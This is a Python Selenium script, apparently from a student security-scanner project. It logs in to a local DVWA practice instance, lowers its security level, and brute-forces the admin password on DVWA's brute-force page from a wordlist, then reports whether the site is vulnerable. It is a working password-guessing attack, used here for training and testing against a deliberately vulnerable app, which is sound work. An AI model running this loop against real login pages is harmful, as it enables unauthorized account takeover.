from selenium import webdriver
from selenium.webdriver.support.ui import Select
from Attack import base_attack


class BRUTE_FORCE(base_attack.Attack):

    def __init__(self, url):
        super().__init__(url)

    @staticmethod
    def main():

        BASE_URL = "http://localhost/DVWA/login.php"
        username = 'admin'
        password = 'password'
        driver = webdriver.Chrome()
        driver.get(BASE_URL)
        
        ###################################PASS THE LOGIN PAGE#################################################
        # Find the username and password input fields on the login page using various locators
        username_field = driver.find_element('name', 'username')
        password_field = driver.find_element('name', 'password')

        # Enter the username and password into their respective fields
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Find and click the login button
        login_button = driver.find_element('name', 'Login')
        login_button.click()
        #######################################################################################################


        ###################################CHANGE LEVEL TO LOW#################################################
        # After logging in, navigate to the desired page
        driver.get("http://localhost/DVWA/security.php")

        select_element = driver.find_element('name', 'security')

        # Use the Select class to interact with the <select> element
        select = Select(select_element)

        # Select the option with value "low"
        select.select_by_value('low')

        submit_button = driver.find_element('name', 'seclev_submit')
        submit_button.click()
        #######################################################################################################


        ##########################GET PASSWORDS LIST FROM FILE#################################################
        # TODO: elad check if the below line will work
        filename = "passwords.txt"
        password_list = []
        with open(filename, 'r') as file:
            for password in file:
                # Remove leading/trailing whitespaces and newlines
                password_list.append(password.strip())


        # TODO: Noam comment: organize the comments

        #######################################################################################################

        ##########################TRY TO FIND THE PASSWORD########################################################
        success = False
        for password in password_list:
            user = 'admin'
            driver.get(f"http://localhost/DVWA/vulnerabilities/brute/?username={user}&password={password}&Login=Login#")
            get_source = driver.page_source
            target_text = 'Welcome to the password protected area'
            if target_text in get_source:
                success = True
                print("Your website is vulnerable to Brute Force attacks!")
                print(f'User: {user}, Password: {password}')
                break
        if not success:
            print("Your website is NOT vulnerable to Brute Force attacks!")

        # TODO: add recommendation for website owner about prevention the attack

        #######################################################################################################

if __name__ == "__main__":
    BRUTE_FORCE.main()